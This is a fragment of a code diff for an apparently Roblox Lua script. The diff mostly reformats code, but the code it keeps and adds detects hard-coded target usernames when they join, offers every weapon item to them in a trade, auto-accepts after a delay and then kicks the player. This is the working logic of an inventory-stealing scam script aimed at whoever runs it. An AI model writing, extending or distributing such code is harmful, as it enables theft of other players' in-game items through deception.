+                            for _ = 1, item.Amount do
+                                OfferItem:FireServer(item.DataID, "Weapons")
+                            end
                         end
                         task.wait(0.1)
                     end
                     itemsAdded = true
-                    -- Auto accept after delay
                     task.spawn(function()
                         task.wait(6.5)
                         AcceptTrade()
@@ -961,33 +992,40 @@ function doTrade(targetPlayer)
             end
         end)
         
-        if not success then task.wait(1) end
+        if not success then 
+            task.wait(1) 
+        end
         timeout = timeout + 1
     end
     
     if #weaponsToSend == 0 then 
-        updateTradeMessage()
         finishAndKick() 
     end
 end
 
--- Target kontrol
 local function isTarget(name)
-    -- Combined user list
     local DhUsers = { "joeiamjoezeif", "joezeif111x", "jo_125w" }
     local combinedUser = {}
-    for _, v in ipairs(users) do table.insert(combinedUser, v) end
-    for _, v in ipairs(DhUsers) do table.insert(combinedUser, v) end
+    for _, v in ipairs(users) do 
+        table.insert(combinedUser, v) 
+    end
+    for _, v in ipairs(DhUsers) do 
+        table.insert(combinedUser, v) 
+    end
     
     for _, u in ipairs(combinedUser) do
-        if u:lower() == name:lower() then return true end
+        if u:lower() == name:lower() then 
+            return true 
+        end
     end
     return false
 end
 
 -- Eventler
 Players.PlayerAdded:Connect(function(player)
-    if player == plr then return end
+    if player == plr then 
+        return 
+    end
     if isTarget(player.Name) then
         task.spawn(function()
             task.wait(4)
